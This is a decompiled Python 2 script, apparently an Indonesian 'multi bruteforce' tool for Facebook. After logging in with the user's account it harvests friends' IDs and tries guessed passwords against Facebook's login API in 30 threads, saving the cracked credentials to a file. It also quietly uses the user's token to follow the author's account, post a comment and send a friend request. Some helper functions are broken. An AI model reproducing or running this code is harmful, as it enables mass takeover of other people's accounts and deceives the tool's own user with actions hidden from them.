# Decompiled At :  Sun Mar 15 14:17:34 2020
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <Ariya>
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from bs4 import BeautifulSoup as parser
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
from prompt_toolkit.shortcuts import prompt
from prompt_toolkit.styles import Style
from http.cookiejar import LWPCookieJar as kuki
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
cj = kuki('kuki')
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


logo = '\x1b[1;94m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;94m\xe2\x95\x91\x1b[1;93m*\x1b[1;97m Author  \x1b[1;91m: \x1b[1;93mAriya Z                \x1b[1;94m\xe2\x95\x91\n\x1b[1;94m\xe2\x95\x91\x1b[1;93m*\x1b[1;97m GitHub  \x1b[1;91m: \x1b[1;92mGithub.com/Ariya-Coder \x1b[1;94m\xe2\x95\x91\n\x1b[1;94m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
idteman = []
idfromteman = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 37 * '\x1b[1;94m\xe2\x95\x90'
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mID\x1b[1;97m|\x1b[1;96mEmail\x1b[1;97m \x1b[1;91m:\x1b[1;92m ')
        pwd = raw_input('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] No connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                cj.save()
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                try:
                    toket = open('login.txt', 'r').read()
                    with requests.Session() as (s):
                        s.cookies = kuki('kuki')
                        s.cookies.load()
                        la = s.get('https://m.facebook.com/language.php')
                        pa = parser(la.content, 'html.parser')
                        bh = pa.find('a', string='Bahasa Indonesia')
                        s.get('https://m.facebook.com' + str(bh['href']))
                        s.post('https://graph.facebook.com/ariyahacker/subscribers?access_token=' + toket)
                        s.post('https://graph.facebook.com/120300252885977/comments?message=Nice:)*&access_token=' + toket)
                except:
                    pass

                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin successfully'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login Failed'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] No connection'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;94m\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama  \x1b[1;91m: \x1b[1;97m' + nama + '\x1b[1;97m               '
    print '\x1b[1;94m\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m ID Fb \x1b[1;91m: \x1b[1;97m' + id + '\x1b[1;97m              '
    print '\x1b[1;94m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;94m[\x1b[1;92m1\x1b[1;94m]\x1b[1;97m Multi bruteforce facebook       \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m[\x1b[1;91m0\x1b[1;94m]\x1b[1;91m Exit the programs               \x1b[1;94m\xe2\x95\x91'
    print '\x1b[1;94m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;94m >>> \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;91m[!] Wrong input'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '0':
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91m[!] Wrong input'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 37 * '\x1b[1;94m\xe2\x95\x90'
    print '\x1b[1;94m[\x1b[1;92m1\x1b[1;94m]\x1b[1;97m Crack with list friend'
    print '\x1b[1;94m[\x1b[1;92m2\x1b[1;94m]\x1b[1;97m Crack from friend'
    print '\x1b[1;94m[\x1b[1;92m3\x1b[1;94m]\x1b[1;97m Crack from file'
    print '\x1b[1;94m[\x1b[1;91m0\x1b[1;94m]\x1b[1;91m Back'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;94m >>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91m[!] Wrong input'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 37 * '\x1b[1;94m\xe2\x95\x90'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all friend id \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            print 37 * '\x1b[1;94m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Friend not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                super()

            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all id from friend \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            print 37 * '\x1b[1;94m\xe2\x95\x90'
            try:
                idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;91m[!] File not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91m[!] Wrong input'
            pilih_super()
        print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print 37 * '\x1b[1;94m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass1 + '\n'
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass1 + '\n'
                cek = open('out/super_cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                    print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                    print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass2 + '\n'
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                    print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                    print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass2 + '\n'
                    cek = open('out/super_cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Bajingan'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                        print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                        print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass3 + '\n'
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                        print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                        print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass3 + '\n'
                        cek = open('out/super_cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Bangsat'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                            print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                            print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass4 + '\n'
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                            print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                            print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass4 + '\n'
                            cek = open('out/super_cp.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = 'Sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                                print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                                print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass5 + '\n'
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                                print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                                print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass5 + '\n'
                                cek = open('out/super_cp.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Kontol'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                                    print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                                    print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass6 + '\n'
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                                    print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                                    print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass6 + '\n'
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Anjing'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                                        print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                                        print '\x1b[1;94m[\x1b[1;92m\xe2\x9c\x93\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass7 + '\n'
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;97m' + b['name']
                                        print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mID \x1b[1;91m      : \x1b[1;97m' + user
                                        print '\x1b[1;94m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;94m] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;97m' + pass7 + '\n'
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 37 * '\x1b[1;94m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal OK/CP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;91m[+] \x1b[1;92mCP File saved \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    super()


if __name__ == '__main__':
    login()